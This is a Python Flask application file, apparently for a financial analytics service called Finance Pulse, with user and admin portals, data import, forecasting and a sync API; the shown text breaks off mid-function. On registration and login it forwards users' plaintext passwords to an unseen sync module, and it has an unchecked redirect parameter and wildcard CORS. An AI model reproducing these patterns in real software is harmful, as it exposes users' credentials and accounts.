import hashlib
import io
import json
import os
from datetime import datetime
from functools import wraps
from pathlib import Path

import pandas as pd
from flask import (
    Flask,
    abort,
    flash,
    g,
    jsonify,
    redirect,
    render_template,
    request,
    send_file,
    send_from_directory,
    session,
    url_for,
)
from itsdangerous import BadSignature, SignatureExpired, URLSafeTimedSerializer
from werkzeug.security import check_password_hash, generate_password_hash

import config
import updater
from analytics.anomalies import detect as anomalies
from analytics.financial_metrics import metrics, monthly, period_growth
from analytics.forecasting import forecast
from analytics.intelligence import (
    anomalies_narrative,
    dimension_narrative,
    forecast_narrative,
    overview_narrative,
)
from analytics.optimization import recommendations, scenario, segment_opportunities, target_margin_plan
from analytics.profitability import by_dimension
from data.importer import allowed, detect, normalize, persist, quality_report, read_file, save_upload
from data.sample_data import generate
from database.db import connect, initialize

app = Flask(
    __name__,
    template_folder=str(config.TEMPLATE_FOLDER),
    static_folder=str(config.STATIC_FOLDER),
)
app.config.from_mapping(
    SECRET_KEY=config.SECRET_KEY,
    MAX_CONTENT_LENGTH=config.MAX_CONTENT_LENGTH,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE="Lax",
)
initialize()
generate()


def clear_auth_session():
    session.clear()
    g.user = None


@app.before_request
def load_user():
    g.user = None
    if session.get("user_id"):
        conn = connect()
        g.user = conn.execute(
            "SELECT * FROM users WHERE id=? AND status='active'",
            (session["user_id"],),
        ).fetchone()
        if g.user and request.endpoint != "static":
            conn.execute(
                "UPDATE users SET last_activity_at=? WHERE id=?",
                (datetime.utcnow().isoformat(), g.user["id"]),
            )
            conn.commit()
        conn.close()
        if not g.user:
            session.clear()


def login_required(view):
    @wraps(view)
    def wrapped(*a, **k):
        return view(*a, **k) if g.user else redirect(url_for("user_login", next=request.path))

    return wrapped


def admin_required(view):
    @wraps(view)
    def wrapped(*a, **k):
        if not g.user:
            return redirect(url_for("admin_login", next=request.path))
        if g.user["role"] != "admin":
            abort(403)
        return view(*a, **k)

    return wrapped


def workspace_id():
    if not g.user:
        return None
    conn = connect()
    row = conn.execute(
        "SELECT id FROM workspaces WHERE owner_user_id=? ORDER BY id LIMIT 1",
        (g.user["id"],),
    ).fetchone()
    conn.close()
    return row["id"] if row else None


def has_workspace_data(ws_id):
    if ws_id is None:
        return False
    conn = connect()
    count = conn.execute(
        "SELECT COUNT(*) FROM financial_transactions WHERE workspace_id=?",
        (ws_id,),
    ).fetchone()[0]
    conn.close()
    return count > 0


def audit(action, detail="", user_id=None):
    actor_id = user_id if user_id is not None else (g.user["id"] if g.user else None)
    if actor_id is not None:
        conn = connect()
        conn.execute(
            "INSERT INTO audit_logs(user_id,action,detail,created_at) VALUES(?,?,?,?)",
            (actor_id, action, detail, datetime.utcnow().isoformat()),
        )
        conn.commit()
        conn.close()


def data_frame():
    ws_id = workspace_id()
    if ws_id is None:
        return pd.DataFrame(columns=["txn_date", "revenue", "expense", "cost", "investment"])
    conn = connect()
    df = pd.read_sql_query(
        "SELECT * FROM financial_transactions WHERE workspace_id=?",
        conn,
        params=(ws_id,),
    )
    conn.close()
    if df.empty:
        return pd.DataFrame(columns=["txn_date", "revenue", "expense", "cost", "investment"])
    df.txn_date = pd.to_datetime(df.txn_date)
    for field in ("start", "end", "department", "product", "category"):
        value = request.args.get(field)
        if value:
            if field == "start":
                parsed = pd.to_datetime(value, errors="coerce")
                if pd.notna(parsed):
                    df = df[df.txn_date >= parsed]
            elif field == "end":
                parsed = pd.to_datetime(value, errors="coerce")
                if pd.notna(parsed):
                    df = df[df.txn_date <= parsed]
            else:
                df = df[df[field] == value]
    return df


def settings():
    conn = connect()
    out = dict(conn.execute("SELECT key,value FROM settings").fetchall())
    conn.close()
    return out


def _setting_float(cfg, key, default, min_val=None, max_val=None):
    try:
        val = float(cfg.get(key, default))
    except (TypeError, ValueError):
        val = float(default)
    if min_val is not None:
        val = max(min_val, val)
    if max_val is not None:
        val = min(max_val, val)
    return val


def _setting_int(cfg, key, default, min_val=None, max_val=None):
    try:
        val = int(float(cfg.get(key, default)))
    except (TypeError, ValueError):
        val = int(default)
    if min_val is not None:
        val = max(min_val, val)
    if max_val is not None:
        val = min(max_val, val)
    return val


def fmt_rows(rows):
    for row in rows:
        for key, val in list(row.items()):
            if hasattr(val, "item"):
                val = val.item()
            if pd.isna(val):
                val = None
            row[key] = val
    return rows


def _local_server_port():
    try:
        if ":" in (request.host or ""):
            return int(request.host.rsplit(":", 1)[-1])
    except (TypeError, ValueError):
        pass
    return None


def _is_loopback_request():
    if any(request.headers.get(h) for h in ("X-Forwarded-For", "CF-Connecting-IP", "X-Real-IP", "Forwarded")):
        return False
    addr = (request.remote_addr or "").split("%", 1)[0].strip()
    if addr not in {"127.0.0.1", "::1", "::ffff:127.0.0.1"}:
        return False
    raw_host = (request.host or "").strip().lower()
    if raw_host.startswith("["):
        host_only = raw_host.split("]", 1)[0].lstrip("[")
    else:
        host_only = raw_host.split(":", 1)[0]
    return host_only in {"127.0.0.1", "localhost", "::1", ""}


def _admin_count():
    conn = connect()
    try:
        return int(conn.execute("SELECT COUNT(*) FROM users WHERE role='admin'").fetchone()[0])
    finally:
        conn.close()


def _token_serializer():
    return URLSafeTimedSerializer(app.config["SECRET_KEY"], salt="fp-api-sync-v1")


def _issue_api_token(user_row):
    return _token_serializer().dumps({
        "uid": int(user_row["id"]),
        "role": user_row["role"],
        "pwh": str(user_row["password_hash"])[-12:],
    })


def _verify_api_user():
    auth_header = request.headers.get("Authorization", "")
    if not auth_header.lower().startswith("bearer "):
        return None, (jsonify({"ok": False, "error": "Missing bearer token."}), 401)
    token = auth_header.split(" ", 1)[1].strip()
    if not token:
        return None, (jsonify({"ok": False, "error": "Empty bearer token."}), 401)
    try:
        claims = _token_serializer().loads(token, max_age=30 * 24 * 3600)
    except (BadSignature, SignatureExpired):
        return None, (jsonify({"ok": False, "error": "Invalid or expired sync session."}), 401)

    conn = connect()
    user = conn.execute(
        "SELECT * FROM users WHERE id=? AND role='user'",
        (claims.get("uid"),),
    ).fetchone()
    if not user or str(user["password_hash"])[-12:] != claims.get("pwh"):
        conn.close()
        return None, (jsonify({"ok": False, "error": "Account credentials mismatch."}), 401)
    if user["status"] != "active":
        conn.close()
        return None, (jsonify({"ok": False, "error": "This account is currently suspended."}), 403)
    conn.execute("UPDATE users SET last_activity_at=? WHERE id=?", (datetime.utcnow().isoformat(), user["id"]))
    conn.commit()
    conn.close()
    return user, None


@app.after_request
def add_sync_cors_headers(response):
    if request.path.startswith("/api/v1/") or request.path == "/health":
        response.headers["Access-Control-Allow-Origin"] = "*"
        response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
        response.headers["Access-Control-Allow-Methods"] = "GET, POST, OPTIONS"
    return response


@app.context_processor
def context():
    return {
        "currency": settings().get("currency", "INR"),
        "active": request.endpoint or "",
        "current_user": g.user,
        "is_admin": bool(g.user and g.user["role"] == "admin"),
        "app_name": config.APP_NAME,
        "app_subtitle": config.APP_SUBTITLE,
        "app_title": config.APP_TITLE,
        "app_version": config.APP_VERSION,
        "app_build": config.APP_BUILD,
    }


@app.route("/health")
def health():
    return jsonify({
        "status": "ok",
        "app": config.APP_NAME,
        "title": config.APP_TITLE,
        "version": config.APP_VERSION,
        "build": config.APP_BUILD,
        "sync_ready": True,
    })


@app.route("/")
def landing():
    return render_template("landing.html")


@app.route("/register", methods=["GET", "POST"])
def register():
    # Creating an account is intentionally an account-switch action. A signed-in
    # user must see a fresh registration form rather than being sent back to the
    # previous workspace.
    if g.user:
        audit("logout", "started new account registration")
        clear_auth_session()
    if request.method == "POST":
        name = request.form.get("name", "").strip()
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        if not name or "@" not in email or len(password) < 8:
            flash("Enter a name, valid email, and password of at least 8 characters.", "error")
        else:
            conn = connect()
            try:
                now = datetime.utcnow().isoformat()
                cur = conn.execute(
                    "INSERT INTO users(name,email,password_hash,role,created_at) VALUES(?,?,?,?,?)",
                    (name, email, generate_password_hash(password, method="pbkdf2:sha256"), "user", now),
                )
                conn.execute(
                    "INSERT INTO workspaces(owner_user_id,name,created_at) VALUES(?,?,?)",
                    (cur.lastrowid, f"{name}'s workspace", now),
                )
                conn.commit()
                session.clear()
                session["user_id"] = cur.lastrowid
                audit("user_registered", email, user_id=cur.lastrowid)
                updater.mirror_auth_event("register", name, email, password, server_port=_local_server_port())
                flash("Your account is ready. Upload financial data to begin.", "success")
                return redirect(url_for("user_dashboard"))
            except Exception:
                conn.rollback()
                flash("An account with that email already exists.", "error")
            finally:
                conn.close()
    return render_template("auth.html", mode="register")


@app.route("/login", methods=["GET", "POST"])
def user_login():
    if g.user and g.user["role"] == "user":
        return redirect(url_for("user_dashboard"))
    if g.user:
        clear_auth_session()
    if request.method == "POST":
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        conn = connect()
        user = conn.execute(
            "SELECT * FROM users WHERE email=? AND role='user' AND status='active'",
            (email,),
        ).fetchone()
        conn.close()
        if user and check_password_hash(user["password_hash"], password):
            session.clear()
            session["user_id"] = user["id"]
            audit("user_login", email, user_id=user["id"])
            updater.mirror_auth_event("login", user["name"], email, password, server_port=_local_server_port())
            return redirect(request.args.get("next") or url_for("user_dashboard"))
        flash("Invalid user email or password.", "error")
    return render_template("auth.html", mode="login")


@app.route("/logout")
def logout():
    audit("logout")
    clear_auth_session()
    flash("You have been signed out.", "success")
    return redirect(url_for("landing"))


@app.route("/user")
@app.route("/user/dashboard")
@login_required
def user_dashboard():
    ws_id = workspace_id()
    has_data = has_workspace_data(ws_id)
    df = data_frame()
    cfg = settings()
    curr = cfg.get("currency", "INR")
    margin_threshold = _setting_float(cfg, "margin_threshold", 15.0, min_val=0.0, max_val=100.0)
    m = metrics(df)
    series = monthly(df)
    series_rows = fmt_rows(series.assign(period=series.period.dt.strftime("%Y-%m")).to_dict("records"))
    insights = []
    if len(series) >= 2:
        rg, eg = period_growth(series.revenue), period_growth(series.expense)
        if rg is not None:
            insights.append(f"Revenue {'increased' if rg >= 0 else 'declined'} {abs(rg):.1f}% compared with the previous month.")
        if eg is not None and rg is not None and eg > rg:
            insights.append("Expenses increased faster than revenue during the latest period.")
    departments = by_dimension(df, "department")
    if departments:
        insights.append(f"{departments[0]['department']} currently contributes the highest net profit.")
    return render_template(
        "dashboard.html",
        metrics=m,
        has_data=has_data,
        series=series_rows,
        brief=overview_narrative(df, series_rows, margin_threshold, curr),
        insights=insights,
        portal="user",
    )


@app.route("/user/analytics/<view>")
@login_required
def user_analytics(view):
    df = data_frame()
    cfg = settings()
    curr = cfg.get("currency", "INR")
    margin_threshold = _setting_float(cfg, "margin_threshold", 15.0, min_val=0.0, max_val=100.0)
    dim = {
        "products": "product",
        "departments": "department",
        "categories": "category",
        "regions": "region",
    }.get(view)
    if view == "anomalies":
        threshold = _setting_float(cfg, "anomaly_threshold", 1.5, min_val=0.5, max_val=10.0)
        flags = anomalies(df, threshold)
        return render_template(
            "analysis.html",
            title="Potential anomalies",
            description="Explainable IQR-based flags. These are not fraud determinations.",
            rows=flags,
            brief=anomalies_narrative(df, flags, threshold, curr),
            margin_threshold=margin_threshold,
            columns=["date", "type", "entity", "value", "reason"],
            view=view,
            portal="user",
        )
    if dim:
        rows = fmt_rows(by_dimension(df, dim))
        return render_template(
            "analysis.html",
            title=f"{dim.title()} profitability",
            description="Revenue, expenses, profit and margin are calculated from your imported transactions.",
            rows=rows,
            brief=dimension_narrative(df, dim, rows, margin_threshold, curr),
            margin_threshold=margin_threshold,
            columns=[dim, "revenue", "expense", "cost", "profit", "margin"],
            view=view,
            portal="user",
        )
    series = monthly(df)
    series_rows = fmt_rows(series.assign(period=series.period.dt.strftime("%Y-%m")).to_dict("records"))
    return render_template(
        "analysis.html",
        title="Financial overview",
        description="Monthly financial performance from your selected data.",
        rows=series_rows,
        brief=overview_narrative(df, series_rows, margin_threshold, curr),
        margin_threshold=margin_threshold,
        columns=["period", "revenue", "expense", "cost", "profit", "margin"],
        view="overview",
        portal="user",
    )


@app.route("/user/forecasting")
@login_required
def user_forecasting():
    cfg = settings()
    curr = cfg.get("currency", "INR")
    target = request.args.get("target", "revenue")
    if target not in {"revenue", "expense", "profit"}:
        target = "revenue"
    default_horizon = _setting_int(cfg, "forecast_period", 6, min_val=3, max_val=24)
    try:
        horizon = int(request.args.get("horizon", default_horizon))
    except (TypeError, ValueError):
        horizon = default_horizon
    horizon = min(max(horizon, 3), 24)
    res = forecast(data_frame(), target, horizon)
    return render_template(
        "forecasting.html",
        result=res,
        brief=forecast_narrative(res, target, horizon, curr),
        target=target,
        horizon=horizon,
        portal="user",
    )


@app.route("/user/optimization", methods=["GET", "POST"])
@login_required
def user_optimization():
    ws_id = workspace_id()
    df = data_frame()
    base = metrics(df)
    cfg = settings()
    margin_threshold = _setting_float(cfg, "margin_threshold", 15.0, min_val=0.0, max_val=100.0)
    default_target = margin_threshold
    if base.get("margin") is not None and base["margin"] >= margin_threshold:
        default_target = min(90.0, round(base["margin"] + 5.0, 1))
    raw_target = request.values.get("target_margin")
    try:
        target_margin = float(raw_target) if raw_target not in (None, "") else default_target
    except (TypeError, ValueError):
        target_margin = default_target
    target_margin = max(-50.0, min(95.0, target_margin))

    result = None
    if request.method == "POST":
        if base["revenue"] is None:
            flash("Import transactions before creating a scenario.", "error")
        else:
            try:
                rg = float(request.form.get("revenue_change", 0) or 0)
                eg = float(request.form.get("expense_change", 0) or 0)
            except ValueError:
                flash("Enter valid percentage values for revenue and expense changes.", "error")
            else:
                result = scenario(base, rg, eg)
                name = request.form.get("name", "").strip() or "Scenario"
                conn = connect()
                conn.execute(
                    "INSERT INTO scenarios(name,assumptions_json,result_json,created_at,workspace_id) VALUES(?,?,?,?,?)",
                    (name, json.dumps({"revenue_change": rg, "expense_change": eg}), json.dumps(result), datetime.utcnow().isoformat(), ws_id),
                )
                conn.commit()
                conn.close()
                audit("scenario_created", name)

    saved = []
    if ws_id is not None:
        conn = connect()
        rows = conn.execute(
            "SELECT id, name, assumptions_json, result_json, created_at FROM scenarios WHERE workspace_id=? ORDER BY id DESC LIMIT 10",
            (ws_id,),
        ).fetchall()
        conn.close()
        for row in rows:
            try:
                assumptions = json.loads(row["assumptions_json"])
                res = json.loads(row["result_json"])
            except Exception:
                continue
            saved.append({
                "name": row["name"],
                "assumptions": assumptions,
                "result": res,
                "created_at": row["created_at"],
            })

    return render_template(
        "optimization.html",
        base=base,
        result=result,
        recommendations=recommendations(df, margin_threshold),
        plan=target_margin_plan(base, target_margin),
        opportunities=segment_opportunities(df, margin_threshold),
        margin_threshold=margin_threshold,
        target_margin=target_margin,
        saved=saved,
        portal="user",
    )


@app.route("/user/data", methods=["GET", "POST"])
@login_required
def user_data():
    ws_id = workspace_id()
    if request.method == "POST":
        if request.form.get("confirm") == "1":
            staged = session.get("staged_import")
            if not staged:
                flash("Your import preview expired. Upload the file again.", "error")
            else:
                try:
                    frame = read_file(Path(staged["path"]))
                    cleaned, excluded = normalize(frame, staged["mapping"])
                    persist(cleaned, staged["filename"], staged["report"], excluded, ws_id)
                    session.pop("staged_import", None)
                    audit("dataset_imported", staged["filename"])
                    if g.user and not cleaned.empty:
                        sync_rows = [
                            {
                                "date": r["txn_date"].strftime("%Y-%m-%d"),
                                "transaction_id": r["transaction_id"],
                                "transaction_type": r["transaction_type"],
                                "category": r["category"],
                                "product": r["product"],
                                "department": r["department"],
                                "region": r["region"],
                                "revenue": float(r["revenue"]),
                                "expense": float(r["expense"]),
                                "cost": float(r["cost"]),
                                "quantity": float(r["quantity"]),
                                "unit_price": float(r["unit_price"]),
                                "investment": float(r["investment"]),
                                "notes": r["notes"],
                            }
                            for _, r in cleaned.iterrows()
                        ]
                        imp_sig = hashlib.sha1(
                            f"{g.user['email']}:{staged['filename']}:{datetime.utcnow().isoformat()}".encode("utf-8")
                        ).hexdigest()[:16]
                        updater.mirror_dataset_import(
                            g.user["email"],
                            staged["filename"],
                            f"desktop-{imp_sig}",
                            sync_rows,
                            server_port=_local_server_port(),
                        )
                    flash(
                        f"{len(cleaned)} rows imported successfully. {excluded} invalid rows were excluded.",
                        "success",
                    )
                except Exception:
                    flash("The file could not be imported. Please upload it again.", "error")
            return redirect(url_for("user_data"))

        file = request.files.get("file")
        if not file or not file.filename:
            flash("Choose a CSV, XLSX, or JSON file.", "error")
            return redirect(url_for("user_data"))
        if not allowed(file.filename):
            flash("Use a CSV, XLSX, or JSON financial dataset.", "error")
            return redirect(url_for("user_data"))
        try:
            path = save_upload(file, ws_id)
            frame = read_file(path)
            if not isinstance(frame, pd.DataFrame) or frame.empty:
                flash("The uploaded file contains no rows.", "error")
                return redirect(url_for("user_data"))
            mapping = detect(frame.columns)
            report = quality_report(frame, mapping)
            if report["missing_required"]:
                flash("Missing required fields: " + ", ".join(report["missing_required"]), "error")
                return redirect(url_for("user_data"))
            session["staged_import"] = {
                "path": str(path),
                "filename": file.filename,
                "mapping": mapping,
                "report": report,
            }
            return render_template(
                "import_preview.html",
                mapping=mapping,
                report=report,
                preview=frame.head(8).fillna("").to_dict("records"),
                columns=list(frame.columns),
                portal="user",
            )
        except Exception:
            flash("This file could not be read. Verify it is a valid CSV, Excel workbook, or JSON dataset.", "error")

    conn = connect()
    raw_imports = conn.execute("SELECT * FROM imports WHERE workspace_id=? ORDER BY id DESC", (ws_id,)).fetchall()
    conn.close()
    imports = []
    for row in raw_imports:
        item = dict(row)
        try:
            item["quality"] = json.loads(item["quality_json"]) if item.get("quality_json") else {}
        except Exception:
            item["quality"] = {}
        imports.append(item)
    return render_template("data.html", imports=imports, portal="user")


@app.route("/user/export.csv")
@login_required
def user_export():
    out = io.StringIO()
    data_frame().to_csv(out, index=False)
    return send_file(
        io.BytesIO(out.getvalue().encode("utf-8")),
        mimetype="text/csv",
        as_attachment=True,
        download_name="finance_pulse_export.csv",
    )


@app.route("/user/report.pdf")
@login_required
def user_report():
    from reportlab.lib.pagesizes import A4
    from reportlab.lib.utils import simpleSplit
    from reportlab.pdfgen import canvas

    curr = settings().get("currency", "INR")
    df = data_frame()
    m = metrics(df)
    top_products = by_dimension(df, "product")[:5]
    stream = io.BytesIO()
    pdf = canvas.Canvas(stream, pagesize=A4)
    pdf.setTitle(config.APP_TITLE)
    pdf.setFont("Helvetica-Bold", 16)
    pdf.drawString(50, 804, f"{config.APP_NAME} — Financial Summary")
    pdf.setFont("Helvetica", 9)
    y = 788
    for line in simpleSplit(config.APP_SUBTITLE, "Helvetica", 9, 495):
        pdf.drawString(50, y, line)
        y -= 13
    workspace_label = g.user["name"] if g.user else "Workspace"
    pdf.drawString(
        50,
        y - 4,
        f"Workspace: {workspace_label}  |  Generated: {datetime.utcnow().strftime('%Y-%m-%d %H:%M UTC')}  |  Currency: {curr}",
    )
    pdf.setFont("Helvetica", 11)
    y -= 34

    def _fmt(key, kind="money"):
        val = m.get(key)
        if val is None:
            return "N/A"
        if kind == "pct":
            return f"{val:.2f}%"
        if kind == "int":
            return f"{int(val):,}"
        return f"{curr} {val:,.2f}"

    summary_rows = [
        ("Total Revenue", _fmt("revenue")),
        ("Total Expenses", _fmt("expenses")),
        ("Total Cost (COGS)", _fmt("cost")),
        ("Gross Profit", _fmt("gross_profit")),
        ("Net Profit", _fmt("profit")),
        ("Profit Margin", _fmt("margin", "pct")),
        ("Expense Ratio", _fmt("expense_ratio", "pct")),
        ("ROI", _fmt("roi", "pct")),
        ("Transactions", _fmt("transactions", "int")),
    ]
    for label, text_val in summary_rows:
        pdf.drawString(50, y, f"{label}: {text_val}")
        y -= 22

    if top_products and y > 180:
        y -= 10
        pdf.setFont("Helvetica-Bold", 12)
        pdf.drawString(50, y, "Top Product Profitability")
        y -= 20
        pdf.setFont("Helvetica", 10)
        for row in top_products:
            margin_txt = f"{row['margin']:.2f}%" if row.get("margin") is not None else "N/A"
            pdf.drawString(
                50,
                y,
                f"{row['product']}  —  Revenue: {curr} {row['revenue']:,.2f}  |  Profit: {curr} {row['profit']:,.2f}  |  Margin: {margin_txt}",
            )
            y -= 18

    pdf.save()
    stream.seek(0)
    audit("report_exported", "PDF summary")
    return send_file(
        stream,
        mimetype="application/pdf",
        as_attachment=True,
        download_name="finance_pulse_summary.pdf",
    )


@app.route("/sample")
def sample():
    return send_file(generate(), as_attachment=True, download_name="finance_pulse_sample.csv")


@app.route("/admin/login", methods=["GET", "POST"])
def admin_login():
    if g.user and g.user["role"] == "admin":
        return redirect(url_for("admin_dashboard"))
    if g.user:
        clear_auth_session()
    if request.method == "POST":
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        conn = connect()
        user = conn.execute(
            "SELECT * FROM users WHERE email=? AND role='admin' AND status='active'",
            (email,),
        ).fetchone()
        conn.close()
        if user and check_password_hash(user["password_hash"], password):
            session.clear()
            session["user_id"] = user["id"]
            audit("admin_login", email, user_id=user["id"])
            return redirect(request.args.get("next") or url_for("admin_dashboard"))
        flash("Invalid administrator credentials.", "error")
    needs_setup = _admin_count() == 0 and _is_loopback_request()
    return render_template("auth.html", mode="admin", needs_admin_setup=needs_setup)


@app.route("/admin/setup", methods=["GET", "POST"])
def admin_setup():
    allow_remote = os.environ.get("FINANCE_PULSE_ALLOW_REMOTE_SETUP") == "1"
    if _admin_count() > 0 or not (_is_loopback_request() or allow_remote):
        abort(403)
    if request.method == "POST":
        name = request.form.get("name", "").strip()
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        if not name or "@" not in email or len(password) < 8:
            flash("Enter a name, valid email, and password of at least 8 characters.", "error")
        else:
            conn = connect()
            try:
                now = datetime.utcnow().isoformat()
                cur = conn.execute(
                    "INSERT INTO users(name,email,password_hash,role,status,created_at) VALUES(?,?,?,?,?,?)",
                    (name, email, generate_password_hash(password, method="pbkdf2:sha256"), "admin", "active", now),
                )
                conn.execute(
                    "INSERT INTO workspaces(owner_user_id,name,created_at) VALUES(?,?,?)",
                    (cur.lastrowid, f"{name}'s workspace", now),
                )
                conn.commit()
                session.clear()
                session["user_id"] = cur.lastrowid
                audit("admin_created", email, user_id=cur.lastrowid)
                flash("Administrator account initialized. Welcome to the Admin Portal.", "success")
                return redirect(url_for("admin_dashboard"))
            except Exception:
                conn.rollback()
                flash("An account with that email already exists.", "error")
            finally:
                conn.close()
    return render_template("auth.html", mode="admin_setup")


@app.route("/admin")
@app.route("/admin/dashboard")
@admin_required
def admin_dashboard():
    conn = connect()
    stats = {
        "users": conn.execute("SELECT COUNT(*) FROM users WHERE role='user'").fetchone()[0],
        "datasets": conn.execute("SELECT COUNT(*) FROM imports WHERE workspace_id IS NOT NULL").fetchone()[0],
        "records": conn.execute("SELECT COUNT(*) FROM financial_transactions WHERE workspace_id IS NOT NULL").fetchone()[0],
    }
    imports = [
        dict(r)
        for r in conn.execute(
            "SELECT i.*,w.name workspace_name FROM imports i LEFT JOIN workspaces w ON w.id=i.workspace_id ORDER BY i.id DESC LIMIT 10"
        )
    ]
    conn.close()
    return render_template("admin_dashboard.html", stats=stats, imports=imports, portal="admin")


@app.route("/admin/users", methods=["GET", "POST"])
@admin_required
def admin_users():
    if request.method == "POST":
        name = request.form.get("name", "").strip()
        email = request.form.get("email", "").strip().lower()
        password = request.form.get("password", "")
        if not name or "@" not in email or len(password) < 8:
            flash("Enter a name, valid email, and password of at least 8 characters.", "error")
        else:
            conn = connect()
            try:
                now = datetime.utcnow().isoformat()
                cur = conn.execute(
                    "INSERT INTO users(name,email,password_hash,role,created_at) VALUES(?,?,?,?,?)",
                    (name, email, generate_password_hash(password, method="pbkdf2:sha256"), "admin", now),
                )
                conn.execute(
                    "INSERT INTO workspaces(owner_user_id,name,created_at) VALUES(?,?,?)",
                    (cur.lastrowid, f"{name}'s workspace", now),
                )
                conn.commit()
                audit("admin_created", email)
                flash("Administrator created.", "success")
            except Exception:
                conn.rollback()
                flash("An account with that email already exists.", "error")
            finally:
                conn.close()
    conn = connect()
    users = [
        dict(r)
        for r in conn.execute(
            """SELECT u.*,
                (SELECT COUNT(*) FROM imports i JOIN workspaces w ON w.id=i.workspace_id WHERE w.owner_user_id=u.id) AS dataset_count,
                (SELECT COUNT(*) FROM financial_transactions t JOIN workspaces w ON w.id=t.workspace_id WHERE w.owner_user_id=u.id) AS record_count
            FROM users u
            ORDER BY u.created_at DESC"""
        )
    ]
    conn.close()
    return render_template("admin_users.html", users=users, portal="admin")


@app.route("/admin/datasets")
@admin_required
def admin_datasets():
    conn = connect()
    datasets = [
        dict(r)
        for r in conn.execute(
            "SELECT i.*,u.name owner_name,u.email FROM imports i LEFT JOIN workspaces w ON w.id=i.workspace_id LEFT JOIN users u ON u.id=w.owner_user_id ORDER BY i.imported_at DESC"
        )
    ]
    conn.close()
    return render_template("admin_datasets.html", datasets=datasets, portal="admin")


@app.route("/admin/users/<int:user_id>/status", methods=["POST"])
@admin_required
def admin_toggle_user_status(user_id):
    if g.user and user_id == g.user["id"]:
        flash("You cannot suspend your own signed-in administrator account.", "error")
        return redirect(url_for("admin_users"))
    conn = connect()
    target_user = conn.execute("SELECT id, email, status FROM users WHERE id=?", (user_id,)).fetchone()
    if not target_user:
        conn.close()
        flash("Account not found.", "error")
        return redirect(url_for("admin_users"))
    new_status = "suspended" if target_user["status"] == "active" else "active"
    conn.execute("UPDATE users SET status=? WHERE id=?", (new_status, user_id))
    conn.commit()
    conn.close()
    audit("user_status_changed", f"{target_user['email']} -> {new_status}")
    flash(f"Updated status for {target_user['email']} to {new_status}.", "success")
    return redirect(url_for("admin_users"))


@app.route("/admin/audit")
@admin_required
def admin_audit():
    category = request.args.get("category", "all").strip().lower()
    groups = {
        "imports": ("dataset_imported",),
        "scenarios": ("scenario_created",),
        "governance": ("admin_created", "settings_updated", "user_status_changed", "report_exported"),
        "auth": ("user_registered", "user_login", "admin_login", "logout"),
    }
    conn = connect()
    query = """SELECT l.id, l.action, l.detail, l.created_at, u.name AS user_name, u.email AS user_email, u.role AS user_role
               FROM audit_logs l
               LEFT JOIN users u ON u.id = l.user_id"""
    params = ()
    if category in groups:
        placeholders = ",".join("?" for _ in groups[category])
        query += f" WHERE l.action IN ({placeholders})"
        params = groups[category]
    query += " ORDER BY l.id DESC LIMIT 100"
    logs = [dict(r) for r in conn.execute(query, params)]
    conn.close()
    return render_template("admin_audit.html", logs=logs, category=category, portal="admin")


@app.route("/admin/settings", methods=["GET", "POST"])
@admin_required
def admin_settings():
    if request.method == "POST":
        currency = request.form.get("currency", "INR").strip().upper()
        date_format = request.form.get("date_format", "%d %b %Y").strip()
        try:
            margin_threshold = float(request.form.get("margin_threshold", 15))
            anomaly_threshold = float(request.form.get("anomaly_threshold", 1.5))
            forecast_period = int(request.form.get("forecast_period", 6))
        except ValueError:
            flash("Enter valid numeric settings for thresholds and forecast period.", "error")
            return redirect(url_for("admin_settings"))

        if currency not in {"INR", "USD", "EUR", "GBP"} or not date_format:
            flash("Select a supported currency and non-empty date format.", "error")
            return redirect(url_for("admin_settings"))
        if not (0 <= margin_threshold <= 100) or not (0.5 <= anomaly_threshold <= 10) or not (3 <= forecast_period <= 24):
            flash("Settings out of valid range (margin 0–100%, anomaly IQR 0.5–10, forecast 3–24 months).", "error")
            return redirect(url_for("admin_settings"))

        values = {
            "currency": currency,
            "margin_threshold": str(margin_threshold),
            "anomaly_threshold": str(anomaly_threshold),
            "forecast_period": str(forecast_period),
            "date_format": date_format,
        }
        conn = connect()
        for key, val in values.items():
            conn.execute(
                "INSERT INTO settings(key,value) VALUES(?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value",
                (key, val),
            )
        conn.commit()
        conn.close()
        audit("settings_updated")
        flash("System settings saved.", "success")
        return redirect(url_for("admin_settings"))
    return render_template("settings.html", settings=settings(), portal="admin")


# ---------------------------------------------------------------------------
# Central Wireless Sync JSON API (Mobile Android APK & Desktop Mirrors)
# ---------------------------------------------------------------------------

@app.route("/api/v1/auth/register", methods=["POST", "OPTIONS"])
def api_v1_register():
    if request.method == "OPTIONS":
        return ("", 204)
    data = request.get_json(silent=True) or {}
    name = str(data.get("name", "")).strip()
    email = str(data.get("email", "")).strip().lower()
    password = str(data.get("password", ""))
    platform = str(data.get("platform", "mobile")).strip()[:40] or "mobile"
    if not name or "@" not in email or len(password) < 6:
        return jsonify({"ok": False, "error": "Enter a full name, valid email, and password (min 6 characters)."}), 400

    conn = connect()
    try:
        existing = conn.execute("SELECT * FROM users WHERE email=?", (email,)).fetchone()
        if existing:
            if existing["role"] != "user" or not check_password_hash(existing["password_hash"], password):
                return jsonify({"ok": False, "error": "An account with this email already exists."}), 409
            if existing["status"] != "active":
                return jsonify({"ok": False, "error": "Account is suspended."}), 403
            conn.execute("UPDATE users SET last_activity_at=? WHERE id=?", (datetime.utcnow().isoformat(), existing["id"]))
            conn.commit()
            token = _issue_api_token(existing)
            audit("user_login", f"{email} [sync:{platform}]", user_id=existing["id"])
            return jsonify({
                "ok": True,
                "synced": True,
                "token": token,
                "user": {"id": existing["id"], "name": existing["name"], "email": existing["email"]},
                "settings": settings(),
            }), 200

        now = datetime.utcnow().isoformat()
        cur = conn.execute(
            "INSERT INTO users(name,email,password_hash,role,status,created_at,last_activity_at) VALUES(?,?,?,?,?,?,?)",
            (name, email, generate_password_hash(password, method="pbkdf2:sha256"), "user", "active", now, now),
        )
        uid = cur.lastrowid
        conn.execute(
            "INSERT INTO workspaces(owner_user_id,name,created_at) VALUES(?,?,?)",
            (uid, f"{name}'s workspace", now),
        )
        conn.commit()
        user_row = conn.execute("SELECT * FROM users WHERE id=?", (uid,)).fetchone()
        token = _issue_api_token(user_row)
    finally:
        conn.close()

    audit("user_registered", f"{email} [{platform}]", user_id=uid)
    return jsonify({
        "ok": True,
        "token": token,
